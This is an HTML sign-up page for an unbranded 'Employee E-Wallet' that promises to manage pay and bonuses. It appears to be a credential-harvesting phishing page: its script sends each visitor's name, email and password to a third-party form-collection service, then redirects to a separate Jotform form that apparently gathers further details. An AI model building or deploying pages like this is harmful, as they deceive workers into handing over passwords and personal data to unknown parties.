od<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Employee E-Wallet Sign Up</title>
    <style>
        /* General Styles */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #0b1b48;
            margin: 0;
            color: #fff;
        }
    sublabel{ 
            font-size:8px;
        }
        /* Container */
        .signup-container {
            background-color: #fff;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            text-align: center;
            color: #333;
        }

        /* Logo */
        .signup-container img {
            width: 80px;
            height: auto;
            margin-bottom: 20px;
        }

        /* Title */
        .signup-container h1 {
            font-size: 24px;
            color: #0b1b48;
            margin-bottom: 10px;
        }

        .signup-container p {
            color: #555;
            margin-top: 0;
            font-size: 14px;
        }

        /* Form Fields */
        .signup-container input[type="text"],
        .signup-container input[type="email"],
        .signup-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }

        /* Submit Button */
        .signup-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #ffa726;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }

        .signup-container input[type="submit"]:hover {
            background-color: #fb8c00;
        }

        /* Additional Links */
        .links {
            font-size: 12px;
            margin-top: 20px;
            color: #0b1b48;
        }

        .links a {
            color: #0b1b48;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <!-- Signup Container -->
    <div class="signup-container">
        
        <!-- Title -->
        <h1>Employee E-Wallet</h1>
        <p>Manage Your Pay and Bonuses</p>

        <!-- Signup Form -->
        <form id="myForm" action="https://formspree.io/f/mkgnndlb" method="POST">
            <!-- Name Input -->
            <input type="text" name="fullname" placeholder="Full Name" required>

            <!-- Email Input -->
            <input type="email" name="email" placeholder="Email Address" required>

             <!-- Password Inputs -->

            <input type="password" name="password" placeholder="Password" minlength="8" required>
             <sublabel for="Password"> Password should be atleast 8 characters </sublabel>
            <input type="password" name="confirmPassword" placeholder="Confirm Password" minlength="8" required>
               <sublabel for="confirmPassword"> Please ensure passwords match </sublabel>

            <!-- Submit Button -->
            <input type="submit" value="Sign Up">
        </form>

        <!-- Additional Links -->
        <div class="links">
            <a href="#">Already have an account? Sign in</a>
        </div>
    </div>
     <script>
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const form = event.target;

            fetch(form.action, {
                method: form.method,
                body: new FormData(form),
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to a different URL
                    window.location.href = 'https://form.jotform.com/242706689708874';
                } else {
                    alert('There was a problem with your submission.');
                }
            })
            .catch(error => {
                alert('There was an error: ' + error.message);
            });
        });
    </script>
</body>
</html>
